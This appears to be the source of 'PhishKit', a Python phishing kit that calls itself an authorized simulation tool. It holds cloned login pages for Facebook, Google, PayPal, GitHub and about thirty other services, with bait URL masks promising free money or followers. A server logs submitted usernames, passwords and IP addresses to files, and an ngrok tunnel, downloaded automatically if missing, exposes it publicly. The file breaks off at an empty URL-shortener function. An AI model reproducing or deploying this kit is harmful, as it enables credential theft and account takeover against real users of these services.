#!/usr/bin/env python3
"""
PhishKit - Authorized Phishing Simulation Framework
Version: 1.0.0
For authorized security testing and educational purposes only.

GNU General Public License v3.0
"""

import os
import sys
import json
import time
import socket
import string
import random
import base64
import hashlib
import threading
import subprocess
import webbrowser
import platform
import shutil
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== CONFIGURATION ==========
VERSION = "1.0.0"
HOST = "127.0.0.1"
PORT = 8080
BASE_DIR = Path(__file__).resolve().parent

# ========== COLORS ==========
class C:
    R = '\033[91m'; G = '\033[92m'; O = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; K = '\033[30m'
    Rb = '\033[101m'; Gb = '\033[102m'; Ob = '\033[103m'
    Bb = '\033[104m'; Cb = '\033[106m'
    RS = '\033[0m\n'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""{C.R}
╔══════════════════════════════════════════╗
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║ ██╔╝   ║
║  ██████╔╝███████║██║███████╗█████╔╝    ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔═██╗    ║
║  ██║     ██║  ██║██║███████║██║  ██╗   ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝   ║
╚══════════════════════════════════════════╝{C.W}
{C.G}PhishKit v{VERSION} - Authorized Phishing Simulation{C.RS}""")

def banner_small():
    print(f"""{C.B}
  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
  {C.R}v{VERSION}{C.RS}""")

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lc + string.digits, k=n))

def mkdir_p(p):
    Path(p).mkdir(parents=True, exist_ok=True)

# ========== ALL 30+ PHISHING TEMPLATES ==========
TEMPLATES = {
    "01": {"name": "Facebook", "key": "facebook", "mask": "blue-verified-badge-for-facebook-free"},
    "02": {"name": "Instagram", "key": "instagram", "mask": "get-unlimited-followers-for-instagram"},
    "03": {"name": "Google", "key": "google", "mask": "get-unlimited-google-drive-free"},
    "04": {"name": "Microsoft", "key": "microsoft", "mask": "unlimited-onedrive-space-for-free"},
    "05": {"name": "Netflix", "key": "netflix", "mask": "upgrade-your-netflix-plan-free"},
    "06": {"name": "PayPal", "key": "paypal", "mask": "get-500-usd-free-to-your-acount"},
    "07": {"name": "Steam", "key": "steam", "mask": "steam-500-usd-gift-card-free"},
    "08": {"name": "Twitter", "key": "twitter", "mask": "get-blue-badge-on-twitter-free"},
    "09": {"name": "PlayStation", "key": "playstation", "mask": "playstation-500-usd-gift-card-free"},
    "10": {"name": "TikTok", "key": "tiktok", "mask": "tiktok-free-liker"},
    "11": {"name": "Twitch", "key": "twitch", "mask": "unlimited-twitch-tv-user-for-free"},
    "12": {"name": "Pinterest", "key": "pinterest", "mask": "get-a-premium-plan-for-pinterest-free"},
    "13": {"name": "Snapchat", "key": "snapchat", "mask": "view-locked-snapchat-accounts-secretly"},
    "14": {"name": "LinkedIn", "key": "linkedin", "mask": "get-a-premium-plan-for-linkedin-free"},
    "15": {"name": "eBay", "key": "ebay", "mask": "get-500-usd-free-to-your-acount"},
    "16": {"name": "Quora", "key": "quora", "mask": "quora-premium-for-free"},
    "17": {"name": "ProtonMail", "key": "protonmail", "mask": "protonmail-pro-basics-for-free"},
    "18": {"name": "Spotify", "key": "spotify", "mask": "convert-your-account-to-spotify-premium"},
    "19": {"name": "Reddit", "key": "reddit", "mask": "reddit-official-verified-member-badge"},
    "20": {"name": "Adobe", "key": "adobe", "mask": "get-adobe-lifetime-pro-membership-free"},
    "21": {"name": "DeviantArt", "key": "deviantart", "mask": "get-500-usd-free-to-your-acount"},
    "22": {"name": "Badoo", "key": "badoo", "mask": "get-500-usd-free-to-your-acount"},
    "23": {"name": "Origin", "key": "origin", "mask": "get-500-usd-free-to-your-acount"},
    "24": {"name": "DropBox", "key": "dropbox", "mask": "get-1TB-cloud-storage-free"},
    "25": {"name": "Yahoo", "key": "yahoo", "mask": "grab-mail-from-anyother-yahoo-account-free"},
    "26": {"name": "WordPress", "key": "wordpress", "mask": "unlimited-wordpress-traffic-free"},
    "27": {"name": "Yandex", "key": "yandex", "mask": "grab-mail-from-anyother-yandex-account-free"},
    "28": {"name": "StackOverflow", "key": "stackoverflow", "mask": "get-stackoverflow-lifetime-pro-membership-free"},
    "29": {"name": "Vk", "key": "vk", "mask": "vk-premium-real-method-2020"},
    "30": {"name": "XBOX", "key": "xbox", "mask": "get-500-usd-free-to-your-acount"},
    "31": {"name": "MediaFire", "key": "mediafire", "mask": "get-1TB-on-mediafire-free"},
    "32": {"name": "GitLab", "key": "gitlab", "mask": "get-1k-followers-on-gitlab-free"},
    "33": {"name": "GitHub", "key": "github", "mask": "get-1k-followers-on-github-free"},
    "34": {"name": "Discord", "key": "discord", "mask": "get-discord-nitro-free"},
    "35": {"name": "Roblox", "key": "roblox", "mask": "get-free-robux"},
}

# ========== GENERIC HTML GENERATOR ==========
def gen_html(site_name, fields=None):
    """Generate a generic login page for any site"""
    cap = site_name.capitalize()
    if fields is None:
        fields = [("email", "Email or Username"), ("password", "Password")]
    
    inputs = ''
    for ftype, ph in fields:
        itype = 'password' if 'pass' in ftype or ftype == 'password' else 'text'
        inputs += f'<input type="{itype}" name="{ftype}" placeholder="{ph}" required>\n'
    
    return f'''<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{cap} - Sign In</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}}
body{{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}}
.card{{max-width:400px;width:100%;background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:40px;text-align:center}}
.logo{{font-size:32px;font-weight:700;color:#1a1a2e;margin-bottom:8px}}
.sub{{color:#666;margin-bottom:30px;font-size:14px}}
input{{width:100%;padding:14px 16px;font-size:15px;border:2px solid #e0e0e0;border-radius:8px;margin-bottom:14px;outline:none;transition:.2s}}
input:focus{{border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,.15)}}
.btn{{width:100%;padding:14px;background:#1a73e8;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:8px;cursor:pointer;transition:.2s}}
.btn:hover{{background:#1558b0}}
.footer{{margin-top:20px;color:#888;font-size:13px}}
</style></head><body>
<div class="card">
<div class="logo">{cap}</div>
<div class="sub">Sign in to your account</div>
<form method="POST" action="/login">
{inputs}
<button class="btn" type="submit">Sign In</button>
</form>
<div class="footer"><a href="#" style="color:#1a73e8;text-decoration:none">Forgot password?</a></div>
</div></body></html>'''

# ========== SITE-SPECIFIC HTML ==========
SITES = {}

def add_template(key, html, mask=""):
    SITES[key] = {"html": html, "mask": mask}

# Facebook
add_template("facebook", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Log In</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:396px;text-align:center}.logo{color:#1877f2;font-size:48px;font-weight:700;margin-bottom:20px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;text-align:left}.card input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px;outline:none}.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}.card button{width:100%;padding:14px;background:#1877f2;color:#fff;font-size:20px;font-weight:700;border:none;border-radius:6px;cursor:pointer}.card button:hover{background:#166fe5}.divider{border-bottom:1px solid #dadde1;margin:20px 0;text-align:center;position:relative}.divider span{background:#fff;padding:0 10px;color:#606770;font-size:12px;position:relative;top:8px}.create-btn{background:#42b72a;color:#fff;font-size:17px;font-weight:700;padding:14px 16px;border:none;border-radius:6px;cursor:pointer;margin-top:10px}.footer{margin-top:20px;color:#737373;font-size:12px}</style></head><body><div class="container"><div class="logo">facebook</div><div class="card"><form method="POST" action="/login"><input type="text" name="email" placeholder="Email address or phone number" required><input type="password" name="pass" placeholder="Password" required><button type="submit">Log In</button></form><div class="divider"><span>or</span></div><button class="create-btn">Create new account</button></div><div class="footer">English (US) · Privacy · Terms · Cookies</div></div></body></html>""", "blue-verified-badge-for-facebook-free")

# Instagram
add_template("instagram", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:350px;width:100%;text-align:center}.login-box{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;margin-bottom:10px}.logo{font-family:'Billabong',sans-serif;font-size:50px;margin-bottom:30px;color:#262626}input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;margin-bottom:6px;outline:none}input:focus{border-color:#a8a8a8}button{width:100%;padding:7px;background:#0095f6;color:#fff;font-weight:600;border:none;border-radius:4px;font-size:14px;cursor:pointer;margin-top:8px}button:hover{background:#1877f2}.or-divider{display:flex;align-items:center;margin:20px 0}.or-divider::before,.or-divider::after{content:'';flex:1;border-bottom:1px solid #dbdbdb}.or-divider span{color:#8e8e8e;font-size:12px;font-weight:600;margin:0 18px}.fb-login{color:#385185;font-weight:600;font-size:14px;margin:10px 0;cursor:pointer}.forgot{color:#00376b;font-size:12px;margin-top:12px;cursor:pointer}.signup-box{background:#fff;border:1px solid #dbdbdb;padding:20px 40px}.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}</style></head><body><div class="container"><div class="login-box"><div class="logo">Instagram</div><form method="POST" action="/login"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="or-divider"><span>OR</span></div><div class="fb-login">Log in with Facebook</div><div class="forgot">Forgot password?</div></div><div class="signup-box">Don't have an account? <a href="#">Sign up</a></div></div></body></html>""", "get-unlimited-followers-for-instagram")

# Google
add_template("google", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google accounts</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{max-width:450px;width:100%;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center}svg.logo{width:75px;height:75px;margin-bottom:20px}h1{font-size:24px;color:#202124;margin-bottom:10px}.subtitle{font-size:16px;color:#202124;margin-bottom:30px}input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;margin-bottom:20px}input:focus{border-color:#1a73e8}.btn{width:100%;padding:13px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:4px;cursor:pointer}.btn:hover{background:#1558b0}.footer{display:flex;justify-content:space-between;margin-top:40px}.footer a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}</style></head><body><div class="card"><svg class="logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.98-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg><h1>Sign in</h1><div class="subtitle">Use your Google Account</div><form method="POST" action="/login"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form><div class="footer"><a href="#">Create account</a><a href="#">Forgot email?</a></div></div></body></html>""", "get-unlimited-google-drive-free")

# Microsoft
add_template("microsoft", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to Microsoft</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Verdana,sans-serif}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{max-width:440px;width:100%;padding:44px}.logo{margin-bottom:24px}h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}.sub{color:#1b1b1b;font-size:15px;margin-bottom:24px}input{width:100%;padding:6px 10px;font-size:15px;border:none;border-bottom:1px solid #8c8c8c;outline:none;margin-bottom:24px;background:transparent}input:focus{border-bottom-color:#0067b8}.btn{width:100%;padding:10px 20px;background:#0067b8;color:#fff;font-size:15px;border:none;cursor:pointer;float:right;width:108px}.btn:hover{background:#005da6}.footer{display:flex;justify-content:space-between;margin-top:48px;font-size:13px}.footer a{color:#0067b8;text-decoration:none}</style></head><body><div class="card"><svg class="logo" width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg><h1>Sign in</h1><div class="sub">to continue to Microsoft</div><form method="POST" action="/login"><input type="text" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><input type="submit" value="Sign in" style="float:right;width:108px;padding:10px 20px;background:#0067b8;color:#fff;font-size:15px;border:none;cursor:pointer"></form><div class="footer"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a></div></div></body></html>""", "unlimited-onedrive-space-for-free")

# PayPal
add_template("paypal", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log in to your PayPal account</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.header{width:100%;padding:20px 0;border-bottom:1px solid #e2e2e2;text-align:center}.card{max-width:400px;width:100%;padding:40px 30px;margin-top:40px}h1{font-size:28px;font-weight:400;color:#2c2e2f;margin-bottom:20px;text-align:center}.tabs{display:flex;margin-bottom:25px;border-bottom:2px solid #e2e2e2}.tab{padding:12px 20px;cursor:pointer;font-size:16px;color:#2c2e2f;border-bottom:2px solid transparent;margin-bottom:-2px}.tab.active{border-bottom-color:#0070ba;font-weight:700;color:#0070ba}input{width:100%;padding:12px 15px;font-size:15px;border:1px solid #9da3a6;border-radius:4px;outline:none;margin-bottom:16px}input:focus{border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,.2)}.btn{width:100%;padding:14px;background:#0070ba;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:25px;cursor:pointer;margin-top:10px}.btn:hover{background:#005ea6}.links{text-align:center;margin-top:20px}.links a{color:#0070ba;font-size:13px;text-decoration:none}</style></head><body><div class="header"><svg height="30" viewBox="0 0 124 33"><path fill="#003087" d="M18.5 2.5L9.5 30.5h-5l-4-28h6l3 20 8-20h6l-2 28h-5z"/><path fill="#009cde" d="M45.5 2.5l-9 28h-5l-4-28h6l3 20 8-20h6l-2 28h-5zM70.5 2.5l-9 28h-5l-3-20-8 20h-5l-5-28h6l3 20 8-20h5l3 20 8-20zM99.5 2.5l-9 28h-5l-4-28h6l3 20 8-20h6l-2 28h-5z"/></svg></div><div class="card"><h1>Log in to your PayPal account</h1><div class="tabs"><div class="tab active">Log In</div><div class="tab">Sign Up</div></div><form method="POST" action="/login"><input type="text" name="email" placeholder="Email or mobile number" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form><div class="links"><a href="#">Having trouble logging in?</a></div></div></body></html>""", "get-500-usd-free-to-your-acount")

# Netflix
add_template("netflix", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Netflix</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:450px;width:100%;background:rgba(0,0,0,.75);padding:60px 68px 40px;border-radius:4px}h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:28px}input{width:100%;padding:14px 16px;background:#333;color:#fff;border:none;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input::placeholder{color:#8c8c8c}input:focus{background:#454545}.btn{width:100%;padding:14px;background:#e50914;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:4px;cursor:pointer;margin-top:8px}.btn:hover{background:#f40612}.remember{display:flex;justify-content:space-between;margin-top:16px;color:#b3b3b3;font-size:13px}.remember a{color:#b3b3b3;text-decoration:none}.footer-text{color:#737373;font-size:16px;margin-top:60px;text-align:center}.footer-text a{color:#fff;text-decoration:none}</style></head><body><div class="container"><h1>Sign In</h1><form method="POST" action="/login"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Sign In</button></form><div class="remember"><label><input type="checkbox" checked> Remember me</label><a href="#">Need help?</a></div><div class="footer-text">New to Netflix? <a href="#">Sign up now</a></div></div></body></html>""", "upgrade-your-netflix-plan-free")

# Steam
add_template("steam", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to Steam</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Motiva Sans',Arial,Helvetica,sans-serif}body{background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:400px;width:100%;padding:40px}.card{background:#181a21;border-radius:4px;padding:32px;border:1px solid #32353c}h1{color:#fff;font-size:24px;font-weight:200;margin-bottom:30px;text-align:center}input{width:100%;padding:12px;background:#32353c;color:#fff;border:1px solid #4b4f57;border-radius:3px;font-size:15px;margin-bottom:12px;outline:none}input:focus{border-color:#1a9fff}.btn{width:100%;padding:14px;background:linear-gradient(90deg,#06bfff 0,#1a82ff);color:#fff;font-size:16px;font-weight:500;border:none;border-radius:3px;cursor:pointer;margin-top:8px}.btn:hover{background:linear-gradient(90deg,#06bfff 0,#1a6eff)}.links{text-align:center;margin-top:20px}.links a{color:#afafaf;font-size:12px;text-decoration:none;margin:0 8px}</style></head><body><div class="container"><div class="card"><h1>Sign in</h1><form method="POST" action="/login"><input type="text" name="username" placeholder="Steam Account Name" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Sign in</button></form><div class="links"><a href="#">Create account</a><a href="#">Help</a></div></div></div></body></html>""", "steam-500-usd-gift-card-free")

# Twitter
add_template("twitter", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log in to Twitter</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{max-width:600px;width:100%;padding:80px 32px;text-align:center}.logo{margin-bottom:36px}h1{font-size:31px;color:#0f1419;margin-bottom:32px;font-weight:700}input{width:100%;padding:20px 12px;font-size:17px;border:1px solid #cfd9de;border-radius:4px;outline:none;margin-bottom:20px}input:focus{border-color:#1d9bf0;box-shadow:0 0 0 2px rgba(29,155,240,.3)}.btn{width:100%;padding:14px;background:#0f1419;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:25px;cursor:pointer;margin-top:4px}.btn:hover{background:#272c30}.footer{color:#536471;font-size:13px;margin-top:40px}.footer a{color:#1d9bf0;text-decoration:none}</style></head><body><div class="card"><svg class="logo" width="40" height="40" viewBox="0 0 24 24"><path fill="#1d9bf0" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg><h1>Sign in to Twitter</h1><form method="POST" action="/login"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Sign in</button></form><button class="btn" style="margin-top:20px;background:#fff;color:#0f1419;border:1px solid #cfd9de">Forgot password?</button><div class="footer">Don't have an account? <a href="#">Sign up</a></div></div></body></html>""", "get-blue-badge-on-twitter-free")

# GitHub
add_template("github", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to GitHub</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}body{background:#f6f8fa;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:340px;width:100%;text-align:center}.logo{margin-bottom:24px}h1{font-size:24px;font-weight:300;color:#24292f;margin-bottom:16px}.card{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;text-align:left}label{display:block;font-size:14px;font-weight:400;color:#24292f;margin-bottom:6px}input{width:100%;padding:8px 12px;font-size:14px;border:1px solid #d0d7de;border-radius:6px;outline:none;margin-bottom:16px;background:#f6f8fa}input:focus{border-color:#0969da;box-shadow:0 0 0 3px rgba(9,105,218,.3)}.btn{width:100%;padding:10px;background:#2da44e;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:6px;cursor:pointer}.btn:hover{background:#2c974b}.footer{border-top:1px solid #d0d7de;margin-top:20px;padding-top:20px;text-align:center}.footer a{color:#0969da;font-size:14px;text-decoration:none}</style></head><body><div class="container"><svg class="logo" width="48" height="48" viewBox="0 0 16 16"><path fill="#24292f" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><h1>Sign in to GitHub</h1><div class="card"><form method="POST" action="/login"><label>Username or email address</label><input type="text" name="username" required><label>Password <a href="#" style="float:right;color:#0969da;font-size:12px">Forgot password?</a></label><input type="password" name="password" required><button class="btn" type="submit">Sign in</button></form></div><div class="footer"><a href="#">Create an account</a></div></div></body></html>""", "get-1k-followers-on-github-free")

# Discord
add_template("discord", """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Whitney','Helvetica Neue',Helvetica,Arial,sans-serif}body{background:#404eed;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{max-width:480px;width:100%;background:#fff;border-radius:8px;padding:32px}h1{color:#060607;font-size:24px;font-weight:600;text-align:center;margin-bottom:8px}.sub{color:#4e5058;font-size:16px;text-align:center;margin-bottom:20px}label{font-size:12px;font-weight:700;color:#4e5058;letter-spacing:.5px;display:block;margin-bottom:8px;margin-top:16px}input{width:100%;padding:14px;background:#e3e5e8;border:none;border-radius:3px;font-size:16px;outline:none;color:#060607}input:focus{background:#d2d5d9}.btn{width:100%;padding:14px;background:#5865f2;color:#fff;font-size:16px;font-weight:500;border:none;border-radius:3px;cursor:pointer;margin-top:20px}.btn:hover{background:#4752c4}.links{text-align:center;margin-top:16px}.links a{color:#00aff4;font-size:14px;text-decoration:none}</style></head><body><div class="container"><h1>Welcome back!</h1><div class="sub">We're so excited to see you again!</div><form method="POST" action="/login"><label>EMAIL OR PHONE NUMBER</label><input type="text" name="email" required><label>PASSWORD</label><input type="password" name="password" required><button class="btn" type="submit">Log In</button></form><div class="links"><a href="#">Forgot your password?</a></div></div></body></html>""", "get-discord-nitro-free")

# Add generic templates for remaining sites
remaining_sites = {
    "linkedin": ("Email", "Password"), "snapchat": ("Username", "Password"),
    "tiktok": ("Email", "Password"), "twitch": ("Username", "Password"),
    "pinterest": ("Email", "Password"), "ebay": ("Email", "Password"),
    "quora": ("Email", "Password"), "protonmail": ("Username", "Password"),
    "spotify": ("Email", "Password"), "reddit": ("Username", "Password"),
    "adobe": ("Email", "Password"), "deviantart": ("Username", "Password"),
    "badoo": ("Email", "Password"), "origin": ("Email", "Password"),
    "dropbox": ("Email", "Password"), "yahoo": ("Email", "Password"),
    "wordpress": ("Username", "Password"), "yandex": ("Login", "Password"),
    "stackoverflow": ("Email", "Password"), "vk": ("Phone or Email", "Password"),
    "xbox": ("Email", "Password"), "mediafire": ("Email", "Password"),
    "gitlab": ("Username", "Password"), "roblox": ("Username", "Password"),
    "playstation": ("Sign-in ID (Email Address)", "Password"),
}

for sk, (f1, f2) in remaining_sites.items():
    html = gen_html(sk.replace('_', ' ').title(), [(f1.lower().replace(' ', '_'), f1), ("password", f2)])
    add_template(sk, html, f"get-free-{sk}-account")

# ========== HTTP HANDLER ==========
class PhishHandler(BaseHTTPRequestHandler):
    creds_file = BASE_DIR / "auth" / "usernames.dat"
    ip_file = BASE_DIR / "auth" / "ip.txt"

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(getattr(self.server, 'phish_html', '<h1>Not configured</h1>').encode())
            return
        self.send_response(302)
        self.send_header('Location', getattr(self.server, 'redirect_url', 'https://www.google.com'))
        self.end_headers()

    def do_POST(self):
        cl = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(cl).decode()
        self._log_creds(data)
        # Capture IP
        ip = self.client_address[0]
        with open(self.ip_file, 'a') as f:
            f.write(f"IP: {ip} | {datetime.now()}\n")
        self.send_response(302)
        self.send_header('Location', getattr(self.server, 'redirect_url', 'https://www.google.com'))
        self.end_headers()

    def _log_creds(self, data):
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        params = {}
        for pair in data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k] = urllib.parse.unquote_plus(v)
        sn = getattr(self.server, 'site_name', 'unknown')
        with open(self.creds_file, 'a') as f:
            f.write(f"\n[{ts}] Site: {sn}\n")
            for k, v in params.items():
                f.write(f"  {k}: {v}\n")
            f.write("-"*40+"\n")
        print(f"\n{C.G}[+] Credentials Captured!{C.W}")
        print(f"{C.O}    Time: {C.C}{ts}{C.W}")
        print(f"{C.O}    Site: {C.C}{sn}{C.W}")
        for k, v in params.items():
            print(f"{C.O}    {k}: {C.G}{v}{C.W}")

    def log_message(self, fmt, *args):
        pass

# ========== TUNNEL ==========
def start_ngrok(port):
    """Start ngrok tunnel and return URL"""
    # Check for ngrok binary
    ngrok = shutil.which('ngrok') or str(BASE_DIR / ".server" / "ngrok")
    if not os.path.exists(ngrok):
        print(f"{C.O}  Ngrok not found. Attempting download...{C.W}")
        mkdir_p(BASE_DIR / ".server")
        arch = platform.machine().lower()
        url_map = {
            'x86_64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz',
            'aarch64': 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz',
        }
        dl = url_map.get(arch, 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz')
        try:
            urllib.request.urlretrieve(dl, '/tmp/ngrok.tgz')
            import tarfile
            with tarfile.open('/tmp/ngrok.tgz') as tf:
                tf.extractall(path=str(BASE_DIR / ".server"))
            os.chmod(ngrok, 0o755)
        except:
            print(f"{C.R}  Download failed. Install ngrok manually: https://ngrok.com/download{C.W}")
            return None

    # Start ngrok
    proc = subprocess.Popen([ngrok, 'http', str(port), '--log=stdout'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    try:
        resp = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels')
        data = json.loads(resp.read())
        if data.get('tunnels'):
            url = data['tunnels'][0]['public_url']
            print(f"{C.G}  Ngrok URL: {C.C}{url}{C.W}")
            return url
    except:
        time.sleep(4)
        try:
            resp = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels')
            data = json.loads(resp.read())
            if data.get('tunnels'):
                url = data['tunnels'][0]['public_url']
                print(f"{C.G}  Ngrok URL: {C.C}{url}{C.W}")
                return url
        except:
            pass
    print(f"{C.R}  Failed to get ngrok URL{C.W}")
    return None

# ========== URL SHORTENER ==========
def shorten_url(url):
